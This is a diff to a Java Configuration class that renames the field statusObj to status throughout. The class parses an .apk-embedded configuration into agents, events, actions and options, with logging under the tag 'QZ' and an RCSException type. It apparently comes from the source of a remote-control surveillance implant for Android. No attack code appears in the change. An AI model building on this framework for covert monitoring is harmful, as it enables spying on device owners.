@@ -31,7 +31,7 @@ public class Configuration {
 	private static final String TAG = "Configuration";
 
 	/** The status obj. */
-	private final Status statusObj;
+	private final Status status;
 
 	/**
 	 * Configuration file embedded into the .apk
@@ -85,7 +85,7 @@ public class Configuration {
 	 *            the resource
 	 */
 	public Configuration(final byte[] resource) {
-		statusObj = Status.self();
+		status = Status.self();
 		this.resource = resource;
 	}
 
@@ -238,7 +238,7 @@ public class Configuration {
 					+ " Params Len: " + plen);
 
 			final AgentConf a = new AgentConf(id, enabled, params);
-			statusObj.addAgent(a);
+			status.addAgent(a);
 		}
 
 		return;
@@ -283,7 +283,7 @@ public class Configuration {
 					+ " Params Len: " + plen);
 
 			final EventConf e = new EventConf(type, i, action, params);
-			statusObj.addEvent(e);
+			status.addEvent(e);
 		}
 
 		return;
@@ -328,7 +328,7 @@ public class Configuration {
 							+ " Params Length: " + plen);
 				}
 
-				statusObj.addAction(a);
+				status.addAction(a);
 			}
 		} catch (final RCSException rcse) {
 			throw rcse;
@@ -374,7 +374,7 @@ public class Configuration {
 			Log.d("QZ", TAG + " Option: " + id + " Params Len: " + plen);
 
 			final Option o = new Option(id, params);
-			statusObj.addOption(o);
+			status.addOption(o);
 		}
 
 		return;
@@ -455,7 +455,7 @@ public class Configuration {
 	 */
 	public void cleanConfiguration() {
 		// Clean an eventual old initialization
-		statusObj.clean();
+		status.clean();
 
 		// Clean configuration buffer
 		wrappedClearConf = null;
